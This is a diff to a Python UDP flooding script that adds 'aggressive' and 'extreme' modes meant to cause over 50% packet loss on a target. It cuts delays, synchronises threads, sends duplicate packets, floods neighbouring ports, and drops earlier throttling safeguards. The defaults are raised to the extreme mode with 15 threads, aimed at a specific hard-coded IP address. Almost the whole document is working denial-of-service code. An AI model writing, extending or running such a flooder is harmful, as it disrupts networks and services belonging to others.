@@ -39,12 +39,16 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
         actual_packet_size = 64
     elif attack_type == "ultragentle":  # New super-conservative mode
         actual_packet_size = 48
+    elif attack_type == "aggressive":  # New aggressive mode
+        actual_packet_size = min(192, packet_size)
+    elif attack_type == "extreme":  # Extreme mode for >50% packet loss
+        actual_packet_size = min(256, packet_size)
     else:
         actual_packet_size = min(128, packet_size)
     
     # Create simpler payload templates - using very small packet sizes
     payload_templates = {}
-    sizes = [48, 64, 96, 128]  # Avoid larger sizes completely
+    sizes = [48, 64, 96, 128, 192, 256]  # Add larger sizes for extreme mode
     for size in sizes:
         try:
             # Create completely random data - no structure at all
@@ -88,19 +92,38 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
         delay_range = (0.001, 0.01)  # Slightly slower than before
         burst_count = 0
         max_burst = random.randint(20, 50)  # Smaller bursts to avoid overwhelming
+    elif attack_type == "aggressive":
+        # New attack type - optimized for high packet loss without crashing
+        delay_range = (0.0005, 0.005)  # Very low delays = higher packet rate
+        cycle_duration = 3.0  # seconds per cycle - faster cycles
+        phase = random.random() * cycle_duration
+        burst_count = 0
+        max_burst = random.randint(30, 80)  # Higher burst count
+    elif attack_type == "extreme":
+        # Extreme attack mode optimized for causing >50% packet loss
+        delay_range = (0.0001, 0.0005)  # Extremely small delays
+        cycle_duration = 2.0  # seconds per cycle - faster cycles
+        phase = (thread_id / 10) % cycle_duration  # Synchronize threads for maximum impact
+        burst_count = 0
+        max_burst = random.randint(100, 500)  # Much larger bursts
     else:  # random, constant or basic
         delay_range = (0.002, 0.02)
     
-    # Target ports - only use main port in gentle/ultragentle modes
+    # Target ports - target multiple ports by default in extreme mode
     target_ports = [target_port]
-    if multi_target and attack_type not in ["gentle", "ultragentle"]:
-        for offset in range(1, 2):  # Only target 1 port before and after
+    if multi_target or attack_type == "extreme":
+        for offset in range(1, 5):  # Target more ports in extreme mode
             target_ports.append(target_port + offset)
             target_ports.append(target_port - offset)
     
     # Main packet sending loop
     burst_counter = 0
     recovery_counter = 0
+    
+    # Prepare a mixed set of payload sizes for extreme mode
+    if attack_type == "extreme":
+        mixed_sizes = [48, 64, 96, 128, 192, 256]
+    
     while time.time() < end_time:
         try:
             # Implement different attack patterns
@@ -238,6 +261,82 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
                     time.sleep(1.0)  # 1-second break to let server recover
                     recovery_counter = 0
                 
+            elif attack_type == "aggressive":
+                # Aggressive mode optimized for packet loss
+                current_time = time.time()
+                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
+                
+                # Shorter, more intense bursts with brief recovery periods
+                if cycle_pos < 0.8:  # 80% of time sending aggressively
+                    # Fast varying rate based on sine wave for maximum disruption
+                    delay_factor = 0.3 + 0.7 * abs(math.sin(cycle_pos * 6 * math.pi))
+                    min_delay, max_delay = delay_range
+                    current_delay = min_delay + (max_delay - min_delay) * delay_factor
+                    time.sleep(current_delay)
+                    
+                    # Use varying packet sizes for maximum effect
+                    if cycle_pos < 0.3:
+                        current_size = 192
+                    elif cycle_pos < 0.6:
+                        current_size = 128
+                    else:
+                        current_size = 64
+                else:
+                    # Short recovery period (20% of the time)
+                    time.sleep(0.01)
+                    current_size = 64
+                
+                # Still implement some limits to avoid server crash
+                burst_counter += 1
+                if burst_counter >= 5000:  # Take a break after every 5000 packets
+                    time.sleep(0.05)
+                    burst_counter = 0
+            
+            elif attack_type == "extreme":
+                # Extreme mode optimized for maximum packet loss
+                current_time = time.time()
+                cycle_pos = (current_time + phase) % cycle_duration / cycle_duration
+                
+                # Very aggressive burst pattern with minimal delays
+                burst_count += 1
+                
+                if burst_count < max_burst:
+                    # Main burst phase - flood-like behavior
+                    time.sleep(delay_range[0])  # Minimal delay between packets
+                    
+                    # Alternate between tiny packets and larger ones for maximum disruption
+                    if burst_count % 2 == 0:
+                        current_size = 48  # Tiny packets
+                    else:
+                        # Vary between medium and large packets
+                        if cycle_pos < 0.3:
+                            current_size = 256  # Large packets
+                        elif cycle_pos < 0.7:
+                            current_size = 192  # Medium-large packets
+                        else:
+                            current_size = 128  # Medium packets
+                else:
+                    # Very brief pause to avoid server crash
+                    time.sleep(0.001)
+                    burst_count = 0
+                    max_burst = random.randint(100, 500)
+                    
+                # Use a synchronized pattern across threads
+                if thread_id % 2 == 0:
+                    # Even threads focus on flooding
+                    time.sleep(delay_range[0])  # Absolutely minimal delay
+                else:
+                    # Odd threads create jitter
+                    if random.random() < 0.2:  # 20% chance
+                        time.sleep(delay_range[1])  # Slightly longer delay
+                    else:
+                        time.sleep(delay_range[0])  # Minimal delay
+                
+                # Use varying packet sizes for maximum network disruption
+                if random.random() < 0.7:  # 70% tiny packets
+                    current_size = random.choice([48, 64])
+                else:  # 30% larger packets
+                    current_size = random.choice([128, 192, 256])
             else:  # Random, constant, or basic
                 time.sleep(random.uniform(*delay_range))
                 current_size = actual_packet_size
@@ -246,26 +345,50 @@ def send_packets(target_ip, target_port, packet_size, duration, attack_type="gra
             packet_count += 1
             
             # Get payload with simplified logic - avoid dynamic calculations
-            if current_size <= 48:
-                payload = payload_templates[48]
-            elif current_size <= 64:
-                payload = payload_templates[64]
-            elif current_size <= 96:
-                payload = payload_templates[96]
+            if attack_type == "extreme":
+                if current_size <= 48:
+                    payload = payload_templates[48]
+                elif current_size <= 64:
+                    payload = payload_templates[64]
+                elif current_size <= 96:
+                    payload = payload_templates[96]
+                elif current_size <= 128:
+                    payload = payload_templates[128]
+                elif current_size <= 192:
+                    payload = payload_templates[192]
+                else:
+                    payload = payload_templates[256]
             else:
-                payload = payload_templates[128]
+                if current_size <= 48:
+                    payload = payload_templates[48]
+                elif current_size <= 64:
+                    payload = payload_templates[64]
+                elif current_size <= 96:
+                    payload = payload_templates[96]
+                else:
+                    payload = payload_templates[128]
             
             # Select a target port
-            current_port = random.choice(target_ports) if multi_target else target_port
+            current_port = random.choice(target_ports) if (multi_target or attack_type == "extreme") else target_port
             
-            # Send packet with additional safeguards
-            if random.random() < 0.95:  # 5% chance of skipping packet to reduce load
-                sock.sendto(payload, (target_ip, current_port))
-                
-                # Update statistics
-                with lock:
-                    packets_sent += 1
-                    bytes_sent += len(payload)
+            # Send packet with modified safeguards for extreme mode
+            if attack_type == "extreme" or random.random() < 0.97:  # Only 3% skipping for extreme mode
+                # For extreme mode, send multiple copies of some packets for assured congestion
+                if attack_type == "extreme" and random.random() < 0.3:  # 30% chance of duplicate packets
+                    for _ in range(3):  # Send 3 copies
+                        sock.sendto(payload, (target_ip, current_port))
+                        
+                        # Update statistics
+                        with lock:
+                            packets_sent += 1
+                            bytes_sent += len(payload)
+                else:
+                    sock.sendto(payload, (target_ip, current_port))
+                    
+                    # Update statistics
+                    with lock:
+                        packets_sent += 1
+                        bytes_sent += len(payload)
                 
         except Exception:
             # Just ignore errors and continue
@@ -370,16 +493,16 @@ def main():
     parser.add_argument('-t', '--target', default="140.118.123.107", help='Target IP address')
     parser.add_argument('-p', '--port', type=int, default=5001, help='Target port')
     parser.add_argument('-d', '--duration', type=int, default=60, help='Test duration in seconds')
-    parser.add_argument('-s', '--size', type=int, default=64, help='Max packet size in bytes (default: 64)')
-    parser.add_argument('-n', '--threads', type=int, default=3, help='Number of threads (default: 3)')
-    parser.add_argument('-a', '--attack-type', default="ultragentle", 
+    parser.add_argument('-s', '--size', type=int, default=128, help='Max packet size in bytes (default: 128)')
+    parser.add_argument('-n', '--threads', type=int, default=15, help='Number of threads (default: 15)')
+    parser.add_argument('-a', '--attack-type', default="extreme", 
                         choices=["distributed", "gradual", "pulse", "random", "slow", 
                                  "tiny", "varied", "basic", "hybrid", "balanced", 
-                                 "gentle", "ultragentle", "help"],
+                                 "gentle", "ultragentle", "aggressive", "extreme", "help"],
                         help='Traffic pattern to use')
     parser.add_argument('-m', '--multi-target', action='store_true', help='Also send to nearby ports')
     parser.add_argument('--stress-test', action='store_true', help='Run a stress test at lower intensity')
-    parser.add_argument('--intensity', type=int, default=1, choices=[1, 2, 3],
+    parser.add_argument('--intensity', type=int, default=3, choices=[1, 2, 3],
                         help='Attack intensity (1=mild, 2=medium, 3=aggressive)')
     parser.add_argument('--progressive', action='store_true', 
                        help='Progressively increase intensity until packet loss is detected')
@@ -388,7 +511,9 @@ def main():
     
     if args.attack_type == "help":
         print("Available attack types:")
-        print("  ultragentle - Super-conservative mode with tiny packets (default)")
+        print("  extreme     - Maximum packet loss attack (>50% loss) (default)")
+        print("  aggressive  - Optimized attack for packet loss without server crash")
+        print("  ultragentle - Super-conservative mode with tiny packets")
         print("  gentle      - Ultra-conservative mode to avoid crashes")
         print("  balanced    - Uses wave patterns for stable packet loss")
         print("  hybrid      - Balanced attack to cause packet loss")
@@ -415,14 +540,20 @@ def main():
         args.threads = min(args.threads, 4) 
         args.size = min(args.size, 96)
     else:  # Aggressive
-        args.threads = min(args.threads, 8)
-        args.size = min(args.size, 128)
+        if args.attack_type == "extreme":
+            # For extreme mode, use more aggressive settings
+            args.threads = min(args.threads, 15)
+            args.size = min(args.size, 256)
+        else:
+            args.threads = min(args.threads, 8)
+            args.size = min(args.size, 128)
     
     # Adjust parameters for stress test
     if args.stress_test:
         args.duration = max(args.duration, 120)
-        args.threads = min(args.threads, 3)
-        args.size = min(args.size, 128)
+        if args.attack_type != "extreme":
+            args.threads = min(args.threads, 3)
+            args.size = min(args.size, 128)
     
     # Start flooding
     flood(args.target, args.port, args.duration, args.size, args.threads, args.attack_type, args.multi_target)
